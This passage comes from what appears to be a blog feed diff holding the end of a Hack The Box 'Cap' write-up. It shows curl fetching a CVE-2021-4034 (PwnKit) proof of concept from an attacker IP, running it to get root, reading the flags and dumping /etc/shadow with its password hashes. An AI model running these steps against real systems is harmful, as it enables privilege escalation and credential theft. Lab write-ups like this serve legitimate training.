+curl 10.10.14.5/cve-2021-4034-poc &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; cve-2021-4034-poc
+&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x cve-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+./cve-2021-4034-poc
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/g&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/user.txt
+526cfc2305f17faaacecf212c57d71c5
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
+0a8ecda83f1d81251099e8ac3d0dcb82
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/shadow
+root:&lt;span class=&quot;nv&quot;&gt;$6$wRmoL66y$Lz9oA82o1iDwKwJjhUwuGhuOakrYdclnbsJ&lt;/span&gt;/K9OQF40hMNk0UDoxtTqQ1UnC8SzLyZ8sujxQjhT/gvmkOfoJZ1:18079:0:99999:7:::
+guly:&lt;span class=&quot;nv&quot;&gt;$6$eKNFoPNC$HlNBvdf0mFXswJ7xRZFaBQgfo0gR626ui&lt;/span&gt;/1rydhlIih/PEqDI8ZsrHUsET1y93GtydanJBwl82eGO8Iw0JJM90:18079:0:99999:7:::
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And that’s it, we’re now root.&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb easy" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">HTB: Knife Writeup</title><link href="/blog/writeup/htb/htb-knife/" rel="alternate" type="text/html" title="HTB: Knife Writeup" /><published>2021-06-13T23:14:00-07:00</published><updated>2021-06-13T23:14:00-07:00</updated><id>/blog/writeup/htb/htb-knife</id><content type="html" xml:base="/blog/writeup/htb/htb-knife/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
 
 &lt;hr /&gt;
 
